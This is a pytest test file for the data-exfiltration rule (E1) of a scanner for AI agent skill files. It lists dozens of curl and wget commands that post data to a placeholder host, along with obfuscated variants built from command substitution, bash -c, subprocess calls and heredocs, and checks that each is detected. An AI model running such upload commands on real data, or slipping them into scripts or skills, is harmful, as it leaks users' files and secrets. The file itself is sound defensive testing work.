# SPDX-FileCopyrightText: Copyright (c) 2026 NVIDIA CORPORATION & AFFILIATES. All rights reserved.
# SPDX-License-Identifier: Apache-2.0
"""External transmission flags must belong to the fetching command."""

import json
from pathlib import Path

import pytest
from typer.testing import CliRunner

from skillspector.cli import app
from skillspector.models import Severity, compute_match_fingerprint
from skillspector.nodes.analyzers import static_patterns_data_exfiltration as exfiltration
from skillspector.nodes.analyzers import static_runner


def _e1(content: str, file_type: str = "markdown"):
    return [
        finding
        for finding in exfiltration.analyze(content, "SKILL.md", file_type)
        if finding.rule_id == "E1"
    ]


@pytest.mark.parametrize("fetch", ["curl -fsS", "wget -qO-"])
@pytest.mark.parametrize("flag", ["-d sample", "--data sample", "--post-data=sample"])
@pytest.mark.parametrize("separator", ["\n", "\r\n", " && ", " || ", " & "])
def test_separate_command_cannot_supply_upload_flag(fetch, flag, separator):
    content = f"{fetch} http://127.0.0.1:8080/health{separator}utility {flag}"
    assert not _e1(content)


@pytest.mark.parametrize("fence", ["```", "~~~~"])
@pytest.mark.parametrize("fetch,flag", [("curl -fsS", "-d"), ("wget -qO-", "--post-file")])
def test_distinct_markdown_fences_cannot_share_flags(fence, fetch, flag):
    content = (
        f"# Local status\n\n{fence}sh\n{fetch} http://127.0.0.1:8080/health\n{fence}\n\n"
        f"# Container startup\n\n{fence}sh\ndocker run {flag} example-service\n{fence}\n"
    )
    assert not _e1(content)


@pytest.mark.parametrize(
    "content",
    [
        "curl http://127.0.0.1:8080/health\n\nA utility accepts --data payload.",
        "curl\n utility --data payload",
        "wget\n utility --post-data=payload",
    ],
)
def test_other_document_content_does_not_supply_upload_flags(content):
    assert not _e1(content)


@pytest.mark.parametrize(
    "command",
    [
        "curl https://example.invalid/submit -d payload",
        "curl https://example.invalid/submit --data payload",
        "curl https://example.invalid/submit --data-raw payload",
        "curl https://example.invalid/submit --data-binary @payload.txt",
        "wget https://example.invalid/submit --post-data=payload",
        "wget https://example.invalid/submit --post-file=payload.txt",
        "curl https://example.invalid/submit \\\n  --data payload",
        "curl https://example.invalid/submit \\\r\n  --data payload",
        "wget https://example.invalid/submit \\\n --post-file=payload.txt",
        'curl "https://example.invalid/\nsubmit" --data payload',
        "curl 'https://example.invalid/\nsubmit' --data payload",
        'curl "$(printf https://example.invalid/; printf submit)" --data payload',
        'curl "$(\n echo https://example.invalid/submit\n)" --data payload',
        'bash -c "curl https://example.invalid/submit --data payload"',
        'subprocess.run("curl https://example.invalid/submit --data payload", shell=True)',
        'echo "$(curl https://example.invalid/submit --data payload)"',
        "{ curl https://example.invalid/submit --data payload; }",
        "if true; then curl https://example.invalid/submit --data payload; fi",
        "curl https://example.invalid/submit <<EOF --data @-\npayload\nEOF",
        "Run curl https://example.invalid/submit --data payload to submit.",
    ],
)
@pytest.mark.parametrize("file_type", ["markdown", "shell"])
def test_real_uploads_remain_detected(command, file_type):
    findings = _e1(command, file_type)
    assert findings
    assert all(finding.severity == Severity.MEDIUM for finding in findings)


@pytest.mark.parametrize(
    "command",
    [
        "curl https://example.invalid/submit ^\n --data payload",
        "curl https://example.invalid/submit ^\r\n --data payload",
        'curl "$(unknown syntax --data payload',
        'curl "unclosed\n --data payload',
        "curl (Get-Endpoint) --data payload",
        "curl https://example.invalid/submit --header (Get-Header) --data payload",
        "wget (Get-Endpoint) --post-data=payload",
        "curl https://example.invalid/submit `\n --data payload",
        "curl --% https://example.invalid/path;part --data payload",
        "wget --% https://example.invalid/path;part --post-data=payload",
        "curl --% https://example.invalid/submit #literal --data payload",
        "curl https://example.invalid/submit --header @{a='b';c='d'} --data payload",
        "curl https://example.invalid/submit --header {Get-Header; Get-Token} --data payload",
        "curl https://example.invalid/submit <# comment ; contents #> --data payload",
        "curl https://example.invalid/submit <# comment\n contents #> --data payload",
        "curl https://example.invalid/path;parameter --data payload",
        "curl https://example.invalid/submit #fragment --data payload",
        "curl " + "--header x " * 1_000 + "https://example.invalid/submit --data payload",
        "curl " + "$(x\n" * 1_500 + "--data payload",
    ],
)
def test_unproved_boundaries_retain_conservative_detection(command):
    assert _e1(command)


@pytest.mark.parametrize(
    "separator", ["\r", "\v", "\f", "\x85", "\u2028", "\u2029", "\u00a0", "\x1c", "\x1d", "\x1e"]
)
@pytest.mark.parametrize("suffix", [" ", "#label "])
def test_native_argument_data_cannot_end_an_upload_command(separator, suffix):
    command = (
        f"curl --user-agent Agent{separator}{suffix}https://example.invalid/submit --data payload"
    )
    assert _e1(command, "shell")


@pytest.mark.parametrize(
    "command",
    [
        'wget "$(curl https://example.invalid/submit --data payload)"',
        'curl --header "x: |" "$(curl https://example.invalid/submit --data payload)"',
        "curl https://example.invalid/ " + "curl x " * 1_000 + " --data payload",
    ],
)
def test_nested_or_repeated_fetches_keep_evidence_without_reparsing_suffixes(command, monkeypatch):
    original = exfiltration._bounded_shell_tokens
    calls = []

    def bounded_tokens(*args, **kwargs):
        calls.append(args[1])
        assert len(calls) <= 2, "Repeated fetch words must not trigger overlapping full parses"
        return original(*args, **kwargs)

    monkeypatch.setattr(exfiltration, "_bounded_shell_tokens", bounded_tokens)
    assert _e1(command)


@pytest.mark.parametrize("separator", ["\n", " && "])
def test_multiple_uploads_keep_separate_locations_and_evidence(separator):
    content = (
        "curl http://127.0.0.1:8080/health"
        + separator
        + "curl https://example.invalid/first --data first"
        + separator
        + "curl https://example.invalid/second --data second"
    )
    findings = _e1(content)
    assert len(findings) == 2
    assert [finding.matched_text for finding in findings] == [
        "curl https://example.invalid/first --data ",
        "curl https://example.invalid/second --data ",
    ]
    assert [finding.location.start_line for finding in findings] == (
        [2, 3] if separator == "\n" else [1, 1]
    )


def test_later_upload_keeps_exact_source_evidence():
    command = "curl --header " + "x" * 240 + " https://example.invalid/submit --data "
    content = "curl http://127.0.0.1:8080/health\n\n" + command + "payload\n"
    findings = _e1(content)
    assert len(findings) == 1
    finding = findings[0]
    assert finding.location.start_line == 3
    assert finding.matched_text == command[:200]
    assert finding.match_fingerprint == compute_match_fingerprint("E1", command)
    assert "submit" in finding.context


def test_runner_keeps_later_upload_location():
    content = (
        "curl http://127.0.0.1:8080/health\n"
        "curl https://example.invalid/submit \\\n  --data payload\n"
    )
    findings = static_runner.run_static_patterns(
        {"components": ["SKILL.md"], "file_cache": {"SKILL.md": content}},
        [exfiltration],
    )
    assert len(findings) == 1
    assert findings[0].rule_id == "E1"
    assert findings[0].start_line == 2
    assert findings[0].matched_text == "curl https://example.invalid/submit \\\n  --data "


def test_non_shell_e1_patterns_are_unchanged():
    for content in [
        'requests.post("https://example.invalid/submit", json={"message": "hello"})',
        "send user data to external services",
        "https://api.example.invalid/v1/",
    ]:
        assert _e1(content)


def test_cli_baseline_preserves_later_upload_evidence(tmp_path: Path):
    skill = tmp_path / "skill"
    skill.mkdir()
    (skill / "SKILL.md").write_text(
        "---\nname: boundary-test\ndescription: Fetch boundary validation.\n---\n"
        "\n```sh\ncurl http://127.0.0.1:8080/health\n"
        "curl https://example.invalid/submit \\\n  --data payload\n```\n",
        encoding="utf-8",
    )
    runner = CliRunner()
    baseline = tmp_path / "baseline.yml"
    generated = runner.invoke(app, ["baseline", str(skill), "--no-llm", "--output", str(baseline)])
    assert generated.exit_code == 0, generated.output
    scanned = runner.invoke(
        app,
        [
            "scan",
            str(skill),
            "--no-llm",
            "--format",
            "json",
            "--baseline",
            str(baseline),
            "--show-suppressed",
        ],
    )
    assert scanned.exit_code == 0, scanned.output
    report = json.loads(scanned.stdout)
    assert not any(issue["id"] == "E1" for issue in report["issues"])
    suppressed = [issue for issue in report["suppressed"] if issue["id"] == "E1"]
    assert len(suppressed) == 1
    assert suppressed[0]["location"]["start_line"] == 8
    assert "submit" in json.dumps(suppressed[0])
